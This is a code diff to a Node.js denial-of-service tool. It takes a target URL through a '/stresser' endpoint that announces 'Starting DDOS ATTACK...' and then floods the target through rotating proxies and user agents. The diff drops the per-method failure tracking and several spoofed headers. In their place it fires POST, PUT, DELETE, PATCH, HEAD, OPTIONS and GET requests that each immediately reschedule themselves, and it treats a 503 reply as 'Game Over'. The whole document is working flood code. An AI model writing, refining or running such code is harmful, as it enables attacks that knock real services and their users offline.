@@ -97,15 +97,6 @@ const proxyFilePath = path.join(__dirname, "proxy.txt");
 const ualist = path.join(__dirname, "ua.txt");
 const numThreads = 10000;
 
-// Add a global object to track failed methods per target URL
-const failedMethods = {};
-
-// Maximum number of failures before disabling a method
-const MAX_FAILURES = 3;
-
-// List of HTTP methods to try
-const httpMethods = ['get', 'post', 'put', 'delete', 'patch', 'head', 'options'];
-
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
 const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");
 
@@ -140,14 +131,6 @@ const performAttack = (url, agent) => {
         }
     }
 
-    // Initialize failed methods for this URL if not already done
-    if (!failedMethods[url]) {
-        failedMethods[url] = {};
-        httpMethods.forEach(method => {
-            failedMethods[url][method] = 0; // Track failure count for each method
-        });
-    }
-
     const headersForRequest = {
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": sanitizeUA(getRandomElement(userAgents())),
@@ -168,176 +151,110 @@ const performAttack = (url, agent) => {
         "Host": url.replace(/https?:\/\//, "").split("/")[0],
         "sec-fetch-site": "same-origin",
         "Sec-Fetch-User": "?1",
-        "Origin": url.split("/").slice(0, 3).join("/"),
-        "X-XSS-Protection": "1; mode=block",
-        "X-Frame-Options": "DENY",
-        "X-Content-Type-Options": "nosniff",
-        "If-None-Match": '"W/"5c-1f7b"',
-        "X-Requested-With": "XMLHttpRequest",
-        "Content-Security-Policy": "default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; object-src 'none';",
-        "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
-        "Feature-Policy": "geolocation 'none'; microphone 'none'; camera 'none';",
-        "Accept-Charset": "utf-8",
-        "Expires": "0",
-        "X-Content-Security-Policy": "default-src 'self';",
-        "X-Download-Options": "noopen",
-        "X-DNS-Prefetch-Control": "off",
-        "X-Permitted-Cross-Domain-Policies": "none",
-        "X-Powered-By": "PHP/7.4.3",
+        "Origin": url.split("/").slice(0, 3).join("/")
     };
 
-    // Helper function to perform a request and handle errors
-    const sendRequest = (method, endpoint, data = null) => {
-        if (failedMethods[url][method] >= MAX_FAILURES) {
-            return Promise.resolve(); // Skip if method has failed too many times
-        }
+    axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/create", {
+        appstate: fakeState(),
+        botname: ['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)],
+        botadmin: Array.from({ length: 14 }, () => Math.floor(Math.random() * 10)).join(''),
+        botprefix: '!@#$%^&*()_+{}|:"<>?`~[];\',./'[Math.floor(Math.random() * 28)],
+        username: `${['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)]}${Array.from({ length: 4 }, () => Math.random().toString(36).charAt(2)).join('')}${Array.from({ length: 2 }, () => Math.floor(Math.random() * 10)).join('')}`
+    }, { httpAgent: agent, headers: headersForRequest })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
 
-        const config = {
-            httpAgent: agent,
-            headers: headersForRequest,
-            timeout: 0,
-        };
+    axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login", {
+        state: fakeState()
+    }, { httpAgent: agent, headers: headersForRequest })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
+        
+    axios.put(url, {
+        state: fakeState()
+    }, { httpAgent: agent, headers: headersForRequest })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
+        
+        axios.delete(url, {
+        state: fakeState()
+    }, { httpAgent: agent, headers: headersForRequest })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
+        
+    axios.patch(url, {
+        state: fakeState()
+    }, { httpAgent: agent, headers: headersForRequest })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
+        
+        axios.head(url, {
+        state: fakeState()
+    }, { httpAgent: agent, headers: headersForRequest })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
 
-        // For OPTIONS and HEAD, do not include a body
-        if (method === 'options' || method === 'head') {
-            return axios[method](endpoint, config);
-        } else {
-            return axios[method](endpoint, data, config);
-        }
-    };
+        axios.options(url, {
+        state: fakeState()
+    }, { httpAgent: agent, headers: headersForRequest })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
 
-    // List of requests to send
-    const requests = [];
-
-    // POST /create
-    if (failedMethods[url]['post'] < MAX_FAILURES) {
-        requests.push(
-            sendRequest('post', url.match(/^(https?:\/\/[^\/]+)/)[0] + "/create", {
-                appstate: fakeState(),
-                botname: ['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)],
-                botadmin: Array.from({ length: 14 }, () => Math.floor(Math.random() * 10)).join(''),
-                botprefix: '!@#$%^&*()_+{}|:"<>?`~[];\',./'[Math.floor(Math.random() * 28)],
-                username: `${['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)]}${Array.from({ length: 4 }, () => Math.random().toString(36).charAt(2)).join('')}${Array.from({ length: 2 }, () => Math.floor(Math.random() * 10)).join('')}`
-            }).catch(err => {
-                if (!err.response?.status) { // Only increment failure count if no status code
-                    failedMethods[url]['post']++;
-                }
-                console.log(`POST /create failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
-            })
-        );
-    }
-
-    // POST /login
-    if (failedMethods[url]['post'] < MAX_FAILURES) {
-        requests.push(
-            sendRequest('post', url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login", {
-                state: fakeState()
-            }).catch(err => {
-                if (!err.response?.status) { // Only increment failure count if no status code
-                    failedMethods[url]['post']++;
-                }
-                console.log(`POST /login failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
-            })
-        );
-    }
-
-    // PUT
-    if (failedMethods[url]['put'] < MAX_FAILURES) {
-        requests.push(
-            sendRequest('put', url, {
-                state: fakeState()
-            }).catch(err => {
-                if (!err.response?.status) { // Only increment failure count if no status code
-                    failedMethods[url]['put']++;
-                }
-                console.log(`PUT failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
-            })
-        );
-    }
-
-    // DELETE
-    if (failedMethods[url]['delete'] < MAX_FAILURES) {
-        requests.push(
-            sendRequest('delete', url, {
-                state: fakeState()
-            }).catch(err => {
-                if (!err.response?.status) { // Only increment failure count if no status code
-                    failedMethods[url]['delete']++;
-                }
-                console.log(`DELETE failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
-            })
-        );
-    }
-
-    // PATCH
-    if (failedMethods[url]['patch'] < MAX_FAILURES) {
-        requests.push(
-            sendRequest('patch', url, {
-                state: fakeState()
-            }).catch(err => {
-                if (!err.response?.status) { // Only increment failure count if no status code
-                    failedMethods[url]['patch']++;
-                }
-                console.log(`PATCH failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
-            })
-        );
-    }
-
-    // HEAD
-    if (failedMethods[url]['head'] < MAX_FAILURES) {
-        requests.push(
-            sendRequest('head', url).catch(err => {
-                if (!err.response?.status) { // Only increment failure count if no status code
-                    failedMethods[url]['head']++;
-                }
-                console.log(`HEAD failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
-            })
-        );
-    }
-
-    // OPTIONS
-    if (failedMethods[url]['options'] < MAX_FAILURES) {
-        requests.push(
-            sendRequest('options', url).catch(err => {
-                if (!err.response?.status) { // Only increment failure count if no status code
-                    failedMethods[url]['options']++;
-                }
-                console.log(`OPTIONS failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
-            })
-        );
-    }
-
-    // GET
-    if (failedMethods[url]['get'] < MAX_FAILURES) {
-        requests.push(
-            sendRequest('get', url).catch(err => {
-                if (!err.response?.status) { // Only increment failure count if no status code
-                    failedMethods[url]['get']++;
-                }
-                console.log(`GET failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
-                if (err.code === "ECONNRESET" || err.code === "ECONNREFUSED" || err.code === "EHOSTUNREACH" || err.code === "ETIMEDOUT" || err.code === "EAI_AGAIN" || err.message === "Socket is closed") {
-                    // console.log(rainbow("Unable to Attack Target Server Refused!"));
-                } else if (err.response?.status === 404) {
-                    // console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
-                } else if (err.response?.status === 503) {
-                    console.log(rainbow("Target under heavy load (503) - Game Over!"));
-                } else if (err.response?.status === 502) {
-                    console.log(rainbow("Bad Gateway (502)."));
-                } else if (err.response?.status === 403) {
-                    // console.log(rainbow("Forbidden (403)."));
-                } else if (err.response?.status) {
-                    // console.log(rainbow(`DDOS Status: (${err.response?.status})`));
-                } else {
-                    // console.log(rainbow(err.message || "ATTACK FAILED!"));
-                }
-            })
-        );
-    }
-
-    // Execute all requests and schedule the next attack
-    Promise.allSettled(requests).then(() => {
-        setTimeout(() => performAttack(url, agent), 0);
-    });
+        
+    axios.get(url, {
+        httpAgent: agent,
+        headers: headersForRequest,
+        timeout: 0,
+    })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch((err) => {
+            if (err.code === "ECONNRESET" || err.code === "ECONNREFUSED" || err.code === "EHOSTUNREACH" || err.code === "ETIMEDOUT" || err.code === "EAI_AGAIN" || err.message === "Socket is closed") {
+                // console.log(rainbow("Unable to Attack Target Server Refused!"));
+            } else if (err.response?.status === 404) {
+                // console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
+            } else if (err.response?.status === 503) {
+                console.log(rainbow("Target under heavy load (503) - Game Over!"));
+            } else if (err.response?.status === 502) {
+                console.log(rainbow("Bad Gateway (502)."));
+            } else if (err.response?.status === 403) {
+                // console.log(rainbow("Forbidden (403)."));
+            } else if (err.response?.status) {
+                // console.log(rainbow(`DDOS Status: (${err.response?.status})`));
+            } else {
+                // console.log(rainbow(err.message || "ATTACK FAILED!"));
+            }
+            setTimeout(() => performAttack(url, agent), 0);
+        });
 };
 
 const startAttack = (url, durationHours) => {
@@ -392,9 +309,9 @@ app.get("/stresser", async (req, res) => {
         return res.status(400).json({ error: "Invalid duration. Please provide a positive duration in hours." });
     }
 
-    await res.json({ message: "Starting DDOS ATTACK..." });
+       await res.json({ message: "Starting DDOS ATTACK..." });
         
-    startAttack(url, durationHours);
+       startAttack(url, durationHours);
 });
 
 const port = process.env.PORT || 25694 || Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
